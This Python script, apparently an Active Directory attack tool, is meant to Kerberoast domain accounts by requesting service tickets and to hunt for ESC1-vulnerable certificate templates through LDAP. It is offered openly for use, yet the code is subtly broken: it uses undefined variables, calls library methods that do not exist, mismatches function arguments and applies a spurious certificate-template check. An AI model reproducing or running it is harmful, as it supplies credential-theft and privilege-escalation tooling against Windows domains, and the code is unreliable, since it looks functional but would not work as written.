from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection
from ldap3 import Server, Connection, SUBTREE


def kerberos_auth(usernameWithDomain, password, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Create a principal for the user
        user_principal = Principal(f"{usernameWithDomain}@{dc_ip}", type="NT_PRINCIPAL")

        # Get a TGT for the user
        smb.kerberosLogin(user_principal, password, domain)

        # If no exceptions were raised, consider the authentication successful
        return True

    except Exception as e:
        print(f"Error during Kerberos authentication: {e}")
        return False

def kerberoast(domain, username, password, dc_ip):
    try:
        print(f"Attempting to Kerberoast accounts from {dc_ip}")

        # Get TGT ticket for the specified user
        krbtgt, krbctx = kerberos_auth(usernameWithDomain, password, domain, dc_ip)

        if krbtgt:
            print("Successfully obtained krbtgt ticket.")
            
            # Find kerberoastable accounts and request service tickets
            kerberoastable_accounts = find_kerberoastable_accounts(krbctx)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
                    # Request service ticket for the kerberoastable account
                    service_ticket = request_service_ticket(krbctx, krbtgt, account)
                    if service_ticket:
                        print("Service ticket obtained.")
                    else:
                        print("Failed to obtain service ticket.")
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def find_kerberoastable_accounts(krbctx):
    try:
        print("Searching for kerberoastable accounts...")
        
        # Fetch all SPNs from the KDC
        spns = krbctx.queryKDC('', constants.KERB_QUERY_SERVICE_SPN)

        # Extract account names from SPNs
        kerberoastable_accounts = set()
        for spn in spns:
            account_name = spn.split('/')[0]
            kerberoastable_accounts.add(account_name)

        print(f"Found {len(kerberoastable_accounts)} kerberoastable accounts.")

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while searching for kerberoastable accounts: {e}")
        return set()

def request_service_ticket(krbctx, krbtgt, target_user):
    try:
        # Retrieve the service ticket for the target user
        tgt_session_key = krbtgt['KDC_REP']['encrypted_part']['session_key']

        # Build the AP-REQ request
        ap_req = AP_REQ()

        # Set the authenticator
        authenticator = types.EncryptedData()
        authenticator['etype'] = krbtgt['KDC_REP']['encrypted_part']['etype']
        authenticator['cipher'] = krbtgt['KDC_REP']['encrypted_part']['cipher']

        # Pack the AP-REQ request
        ap_req_data = ap_req.getData()

        # Get the service ticket for the target user
        service_ticket = krbctx.getServiceTicket(krbtgt, target_user, sessionKey=tgt_session_key, ap_req=ap_req_data)

        return service_ticket

    except Exception as e:
        print(f"Error while requesting service ticket: {e}")
        return None

def find_certificate_authorities(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via LDAP
        server = Server(dc_ip)
        conn = Connection(server, user=f"{domain}\\{username}", password=password)
        conn.bind()

        # Search for Certificate Authorities
        conn.search(search_base='CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,' +
                                  ','.join(f"DC={dc}" for dc in domain.split('.')),
                     search_filter='(objectClass=pKICertificateAuthority)',
                     search_scope=SUBTREE,
                     attributes=['dNSHostName'])

        cas = []
        for entry in conn.entries:
            cas.append(entry['dNSHostName'].value)

        conn.unbind()
        return cas

    except Exception as e:
        print(f"Error while finding Certificate Authorities: {e}")
        return []

def check_esc1_certificates(username, password, domain, dc_ip):
    try:
        # Find all Certificate Authorities
        cas = find_certificate_authorities(username, password, domain, dc_ip)
        if not cas:
            print("No Certificate Authorities found.")
            return

        # Check ESC1 certificates for each Certificate Authority
        for ca in cas:
            print(f"Checking ESC1 certificates for Certificate Authority: {ca}")

            # Connect to the Certificate Authority via LDAP
            ca_server = Server(ca)
            conn = Connection(ca_server, user=f"{domain}\\{username}", password=password)
            conn.bind()

            # Search for ESC1 certificate templates
            conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' +
                                      ','.join(f"DC={dc}" for dc in domain.split('.')),
                         search_filter='(objectClass=pKICertificateTemplate)',
                         search_scope=SUBTREE,
                         attributes=['displayName', 'msPKI-Certificate-Template-OID'])

            esc1_templates = []
            for entry in conn.entries:
                if entry['msPKI-Certificate-Template-OID'].startswith('1.3.6.1.4.1.311.21.8.106'):
                    esc1_templates.append(entry['displayName'].value)

            if esc1_templates:
                print("ESC1 Certificate Templates found:")
                for template in esc1_templates:
                    print(template)
            else:
                print("No ESC1 Certificate Templates found.")

            conn.unbind()

    except Exception as e:
        print(f"Error while checking ESC1 certificates: {e}")



# Example usage:
username = input("Enter username: ")
usernameWithDomain = input("Enter your username in this format: DOMAIN/username")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(usernameWithDomain, username, password, dc_ip)
check_esc1_certificates(username, password, domain, dc_ip)